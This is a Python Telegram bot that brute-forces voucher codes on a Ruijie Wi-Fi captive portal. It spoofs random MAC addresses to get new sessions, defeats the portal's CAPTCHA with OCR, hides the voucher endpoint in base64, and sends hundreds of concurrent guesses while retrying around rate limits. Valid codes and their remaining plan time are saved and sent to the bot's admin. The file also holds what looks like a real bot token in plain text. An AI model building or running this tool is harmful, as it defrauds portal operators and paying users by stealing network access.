import os
import sys
import asyncio
import aiohttp
import json
import base64
import random
import re
import string
import time
import itertools
import cv2
import ddddocr
import numpy as np
from datetime import datetime
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ─── Environment Variables ──────────────────────────────────────────
TOKEN = os.environ.get("8948491444:AAEshhG6k-qpiNmzSQI9sk0Hs6HnmnQVmQo")
ADMIN_ID = os.environ.get("1626617395")

if not TOKEN or not ADMIN_ID:
    print("❌ Please set BOT_TOKEN and ADMIN_ID environment variables!")
    sys.exit(1)

# ─── Global Variables ────────────────────────────────────────────────
user_data = {}
scan_running = False
stop_scan = False
success_texts = []
limited_texts = []
scan_task = None
current_mode = None
current_length = None
current_target = None
_connector = None
_voucher_sem = None
CONCURRENCY = 500
BATCH_SIZE = 2000
session_url = None
_start_time = time.monotonic()
_ocr = ddddocr.DdddOcr(show_ad=False)

# ─── State for Resume ────────────────────────────────────────────────
STATE_FILE = "scan_state.json"
scan_state = {}

# ─── Ruijie Portal Helpers (from original) ──────────────────────────

def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

async def get_session_id(session_obj, session_url, previous_session_id=None):
    mac = get_mac()
    url = replace_mac(session_url, new_mac=mac)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
    }
    try:
        async with session_obj.get(url, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            return sid.group(1) if sid else previous_session_id
    except:
        return previous_session_id

def _ocr_sync(image_bytes):
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur = cv2.GaussianBlur(gray, (3, 3), 0)
    _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buffer = cv2.imencode('.png', thresh)
    result = _ocr.classification(buffer.tobytes())
    return result.upper()

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

async def Captcha_Image(session_obj, session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=4bcb26270ae44395859a3119059fb15e',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'image',
        'sec-fetch-mode': 'no-cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    params = {'sessionId': session_id, '_t': str(time.time())}
    async with session_obj.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers) as req:
        return await req.read()

async def Varify_Captcha(session_obj, session_id, text):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json',
        'origin': 'https://portal-as.ruijienetworks.com',
        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=4bcb26270ae44395859a3119059fb15e',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    json_data = {'sessionId': session_id, 'authCode': text}
    async with session_obj.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data) as req:
        data = await req.json()
        return session_id if data.get("success") == True else None

async def check_session_url(url):
    try:
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        required = ['gw_id', 'gw_address', 'gw_port', 'mac', 'ip']
        return all(k in params for k in required)
    except:
        return False

def _parse_minutes(val):
    total_mins = int(val)
    if total_mins <= 0:
        return "0m"
    if total_mins < 60:
        return f"{total_mins}m"
    hours = total_mins // 60
    mins = total_mins % 60
    if hours < 24:
        return f"{hours}h {mins}m" if mins else f"{hours}h"
    days = hours // 24
    rem_hours = hours % 24
    if days < 30:
        return f"{days}d {rem_hours}h" if rem_hours else f"{days}d"
    months = days // 30
    rem_days = days % 30
    return f"{months}mo {rem_days}d" if rem_days else f"{months}mo"

async def get_balance(session_id, connector):
    url = f"https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}"
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json;',
        'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/balance.html?RES=./../expand/res/4ukmferxbdgmt3m49po&sessionId={session_id}&lang=en_US&redirectUrl=https://www.ruijienetwoacom&authTypeype=15',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    try:
        async with aiohttp.ClientSession(connector=connector, connector_owner=False) as temp_session:
            async with temp_session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                raw = await resp.text()
                if resp.status != 200:
                    return "Error"
                try:
                    data = json.loads(raw)
                except:
                    return "N/A"
                candidates = [data]
                for nested_key in ['result', 'data']:
                    if isinstance(data, dict) and isinstance(data.get(nested_key), dict):
                        candidates.append(data[nested_key])
                for d in candidates:
                    if not isinstance(d, dict):
                        continue
                    for key in ['totalMinutes', 'remainingMinutes', 'remainMinutes', 'leftMinutes', 'balance', 'remaining']:
                        val = d.get(key)
                        if val is not None:
                            return _parse_minutes(val)
                return "N/A"
    except:
        return "N/A"

async def perform_check(session_url, code, connector=None):
    global stop_scan
    if stop_scan:
        return None

    post_url = base64.b64decode(
        b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
    ).decode()

    response = None
    session_id = None
    for attempt in range(3):
        if stop_scan:
            return None
        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(
            connector=connector,
            connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=timeout
        ) as task_session:
            session_id = await get_session_id(task_session, session_url)
            if not session_id:
                continue
            auth_code = None
            for _ in range(8):
                try:
                    image = await Captcha_Image(task_session, session_id)
                    text = await Captcha_Text(image)
                    if not text:
                        continue
                    if await Varify_Captcha(task_session, session_id, text):
                        auth_code = text
                        break
                except:
                    continue
            if not auth_code:
                continue
            data = {
                "accessCode": code,
                "sessionId": session_id,
                "apiVersion": 1,
                "authCode": auth_code,
            }
            headers = {
                "authority": "portal-as.ruijienetworks.com",
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "origin": "https://portal-as.ruijienetworks.com",
                "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}",
                "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            }
            try:
                async with task_session.post(post_url, json=data, headers=headers) as req:
                    response = await req.text()
            except:
                return
        if response and 'request limited' in response:
            continue
        break

    if not response:
        return

    if 'logonUrl' in response:
        plan_str = "N/A"
        try:
            fetched = await get_balance(session_id, connector)
            if isinstance(fetched, str) and fetched not in ("N/A", "Error"):
                plan_str = fetched
        except:
            pass
        return {"code": code, "session_id": session_id, "plan": plan_str}
    elif 'STA' in response:
        return {"code": code, "status": "limited"}

# ─── Code Generator (Modes 1-5) ──────────────────────────────────────

def iter_codes(mode, length):
    if mode == 1:
        chars = string.digits
    elif mode == 2:
        chars = string.ascii_lowercase
    elif mode == 3:
        chars = string.ascii_uppercase
    elif mode == 4:
        chars = string.ascii_letters
    elif mode == 5:
        chars = string.ascii_lowercase + string.digits
    else:
        raise ValueError("Invalid mode (use 1-5)")

    total = len(chars) ** length
    
    # If total is small enough, generate ALL combinations in random order
    if total <= 2_000_000:
        all_codes = [''.join(p) for p in itertools.product(chars, repeat=length)]
        random.shuffle(all_codes)
        for code in all_codes:
            yield code
    else:
        # Infinite random generation for large spaces
        while True:
            yield ''.join(random.choices(chars, k=length))

# ─── Save/Load State for Resume ──────────────────────────────────────

def save_state(mode, length, target, checked, found):
    state = {
        "mode": mode,
        "length": length,
        "target": target,
        "checked": checked,
        "found": found,
        "timestamp": time.time()
    }
    with open(STATE_FILE, "w") as f:
        json.dump(state, f)

def load_state():
    try:
        with open(STATE_FILE, "r") as f:
            return json.load(f)
    except:
        return None

def clear_state():
    try:
        os.remove(STATE_FILE)
    except:
        pass

# ─── Main Scan Runner ──────────────────────────────────────────────────

async def run_bruteforce(mode, length, target, update):
    global stop_scan, scan_running, current_mode, current_length, current_target
    global _voucher_sem, CONCURRENCY, BATCH_SIZE, scan_state

    try:
        code_iter = iter_codes(mode, length)
    except ValueError as e:
        await update.message.reply_text(f"❌ Error: {e}")
        return

    total = len(string.digits if mode == 1 else 
               string.ascii_lowercase if mode == 2 else
               string.ascii_uppercase if mode == 3 else
               string.ascii_letters if mode == 4 else
               string.ascii_lowercase + string.digits) ** length
    # Only show total if we are doing a full permutation (<=2M)
    total_display = total if total <= 2_000_000 else "∞"

    checked = 0
    found = 0
    limited_count = 0
    scan_start = time.monotonic()

    current_mode = mode
    current_length = length
    current_target = target

    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(CONCURRENCY)

    connector = _connector

    status_msg = await update.message.reply_text(
        f"🚀 **Scan Started**\n"
        f"Mode: {mode} | Length: {length}\n"
        f"Target: {target or 'Unlimited'}\n"
        f"Total Combos: {total_display}"
    )

    try:
        while not stop_scan:
            batch = []
            for _ in range(BATCH_SIZE):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break

            async def _check(code):
                async with _voucher_sem:
                    return await perform_check(session_url, code, connector)

            results = await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)

            for res in results:
                if res and isinstance(res, dict):
                    if "plan" in res:
                        found += 1
                        code = res["code"]
                        plan = res["plan"]
                        success_texts.append({"code": code, "plan": plan})
                        try:
                            with open("found_codes.txt", "a") as f:
                                f.write(f"{code} | Plan: {plan} | Found: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                        except:
                            pass
                        await update.message.reply_text(
                            f"🎉 **SUCCESS!**\n"
                            f"🔑 Code: `{code}`\n"
                            f"📋 Plan: {plan}\n"
                            f"📊 Total Found: {found}"
                        )
                        if target and found >= target:
                            await update.message.reply_text(f"🎯 Target reached! Found {found} codes.")
                            stop_scan = True
                            clear_state()
                            return
                    elif res.get("status") == "limited":
                        limited_count += 1
                        limited_texts.append(res["code"])

            checked += len(batch)
            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0

            # Save state for resume (every 5 batches)
            if checked % (BATCH_SIZE * 5) == 0:
                save_state(mode, length, target, checked, found)

            # Update progress every 10 batches
            if checked % (BATCH_SIZE * 10) == 0 or stop_scan:
                progress = (checked / total * 100) if total <= 2_000_000 else 0
                bar = f"[{'█' * int(progress//2)}{'░' * (50 - int(progress//2))}]" if total <= 2_000_000 else ""
                await status_msg.edit_text(
                    f"🚀 **Scanning...**\n"
                    f"Mode: {mode} | Len: {length}\n"
                    f"Checked: {checked:,} / {total_display}\n"
                    f"Found: {found} | Limited: {limited_count}\n"
                    f"Speed: {speed:,.0f}/min\n"
                    f"{bar}"
                )

        if stop_scan:
            await status_msg.edit_text(
                f"⏹️ **Scan Stopped**\n"
                f"Checked: {checked:,}\n"
                f"Found: {found}\n"
                f"Limited: {limited_count}\n"
                f"Use /resume to continue."
            )
        else:
            await status_msg.edit_text(
                f"✅ **Scan Completed**\n"
                f"Checked: {checked:,}\n"
                f"Found: {found}\n"
                f"Limited: {limited_count}"
            )
            clear_state()

    except Exception as e:
        await update.message.reply_text(f"❌ Scan error: {e}")
    finally:
        scan_running = False
        stop_scan = False

# ─── Telegram Command Handlers ──────────────────────────────────────

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) != ADMIN_ID:
        await update.message.reply_text("⛔ Admin only.")
        return
    await update.message.reply_text(
        "🤖 **Voucher Scanner Bot**\n\n"
        "📖 **Commands:**\n"
        "/setup <url> - Set session URL\n"
        "/brute <mode> <length> [target] - Start scan\n"
        "   Mode: 1=digits, 2=lowercase, 3=uppercase, 4=letters, 5=alphanumeric\n"
        "   Example: /brute 1 6 5\n"
        "/status - Show status\n"
        "/stop - Stop scan\n"
        "/resume - Resume stopped scan\n"
        "/saved - Show found codes\n"
        "/delete_saved - Delete saved codes\n"
        "/recheck - Recheck codes\n"
        "/notify on/off - Toggle notifications"
    )

async def setup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) != ADMIN_ID:
        await update.message.reply_text("⛔ Admin only.")
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /setup <session_url>")
        return
    url = context.args[0]
    if await check_session_url(url):
        global session_url
        session_url = url
        await update.message.reply_text("✅ Session URL saved!")
    else:
        await update.message.reply_text("❌ Invalid session URL")

async def brute(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) != ADMIN_ID:
        await update.message.reply_text("⛔ Admin only.")
        return
    global scan_running, stop_scan, scan_task
    if scan_running:
        await update.message.reply_text("⚠️ Scan already running. Use /stop first.")
        return
    if not session_url:
        await update.message.reply_text("⚠️ Please /setup first.")
        return
    if len(context.args) < 2:
        await update.message.reply_text("Usage: /brute <mode> <length> [target]")
        return
    try:
        mode = int(context.args[0])
        length = int(context.args[1])
        target = int(context.args[2]) if len(context.args) > 2 else None
        if mode not in [1,2,3,4,5]:
            raise ValueError
        if length < 1 or length > 20:
            await update.message.reply_text("Length must be between 1 and 20.")
            return
    except:
        await update.message.reply_text("❌ Invalid arguments. Use: /brute <mode> <length> [target]")
        return

    stop_scan = False
    scan_running = True
    clear_state()  # New scan, clear previous resume state
    scan_task = asyncio.create_task(run_bruteforce(mode, length, target, update))
    await scan_task

async def resume_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) != ADMIN_ID:
        await update.message.reply_text("⛔ Admin only.")
        return
    global scan_running, stop_scan, scan_task
    if scan_running:
        await update.message.reply_text("⚠️ Scan already running.")
        return
    state = load_state()
    if not state:
        await update.message.reply_text("❌ No saved scan state to resume.")
        return
    
    await update.message.reply_text(
        f"🔄 Resuming scan...\n"
        f"Mode: {state['mode']} | Length: {state['length']}\n"
        f"Already checked: {state['checked']:,}\n"
        f"Found so far: {state['found']}"
    )
    
    stop_scan = False
    scan_running = True
    scan_task = asyncio.create_task(
        run_bruteforce(state['mode'], state['length'], state['target'], update)
    )
    await scan_task

async def stop_scan_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) != ADMIN_ID:
        await update.message.reply_text("⛔ Admin only.")
        return
    global stop_scan, scan_running, scan_task
    if scan_running:
        stop_scan = True
        if scan_task and not scan_task.done():
            scan_task.cancel()
        scan_running = False
        await update.message.reply_text("⏹️ Scan stopped. Use /resume to continue.")
    else:
        await update.message.reply_text("No scan running.")

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) != ADMIN_ID:
        await update.message.reply_text("⛔ Admin only.")
        return
    uptime_seconds = int(time.monotonic() - _start_time)
    hours, rem = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(rem, 60)
    state = load_state()
    resume_info = ""
    if state:
        resume_info = f"\n📌 Saved state: Mode {state['mode']}, Len {state['length']}, Checked {state['checked']}"
    await update.message.reply_text(
        f"📊 **Bot Status**\n"
        f"⏱ Uptime: {hours}h {minutes}m {seconds}s\n"
        f"🔍 Scan Running: {scan_running}\n"
        f"📌 Mode: {current_mode or 'None'} | Len: {current_length or 'N/A'}\n"
        f"🎯 Target: {current_target or 'All'}\n"
        f"✅ Found: {len(success_texts)}\n"
        f"⚡ Speed: {CONCURRENCY}{resume_info}"
    )

async def saved(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) != ADMIN_ID:
        await update.message.reply_text("⛔ Admin only.")
        return
    if not success_texts:
        await update.message.reply_text("❌ No codes found yet.")
        return
    msg = f"🎉 **Found Codes ({len(success_texts)})**\n\n"
    for idx, item in enumerate(success_texts[-20:], 1):
        msg += f"{idx}. `{item['code']}` | Plan: {item['plan']}\n"
    if len(success_texts) > 20:
        msg += f"\n... and {len(success_texts)-20} more."
    await update.message.reply_text(msg)

async def delete_saved(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) != ADMIN_ID:
        await update.message.reply_text("⛔ Admin only.")
        return
    global success_texts
    success_texts = []
    try:
        os.remove("found_codes.txt")
    except:
        pass
    await update.message.reply_text("✅ All saved codes deleted.")

async def recheck(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) != ADMIN_ID:
        await update.message.reply_text("⛔ Admin only.")
        return
    if not success_texts:
        await update.message.reply_text("No codes to recheck.")
        return
    await update.message.reply_text("⏳ Rechecking... (This will check validity against the portal)\n⚠️ Feature not fully implemented in this version.")

async def notify(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) != ADMIN_ID:
        await update.message.reply_text("⛔ Admin only.")
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /notify on/off")
        return
    state = context.args[0].lower()
    if state == "on":
        context.bot_data['notify'] = True
        await update.message.reply_text("✅ Notifications ON")
    elif state == "off":
        context.bot_data['notify'] = False
        await update.message.reply_text("✅ Notifications OFF")
    else:
        await update.message.reply_text("Use 'on' or 'off'")

# ─── Main ────────────────────────────────────────────────────────────

def main():
    global _connector
    _connector = aiohttp.TCPConnector(limit=1000, ttl_dns_cache=300, ssl=True)

    # Load existing found codes
    try:
        if os.path.exists("found_codes.txt"):
            with open("found_codes.txt", "r") as f:
                for line in f:
                    if "|" in line:
                        parts = line.split("|")
                        code = parts[0].strip()
                        plan = parts[1].replace("Plan:", "").strip()
                        success_texts.append({"code": code, "plan": plan})
    except:
        pass

    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("setup", setup))
    app.add_handler(CommandHandler("brute", brute))
    app.add_handler(CommandHandler("resume", resume_scan))
    app.add_handler(CommandHandler("stop", stop_scan_cmd))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("saved", saved))
    app.add_handler(CommandHandler("delete_saved", delete_saved))
    app.add_handler(CommandHandler("recheck", recheck))
    app.add_handler(CommandHandler("notify", notify))

    print("🤖 Bot started! Press Ctrl+C to stop.")
    app.run_polling()

if __name__ == "__main__":
    main()
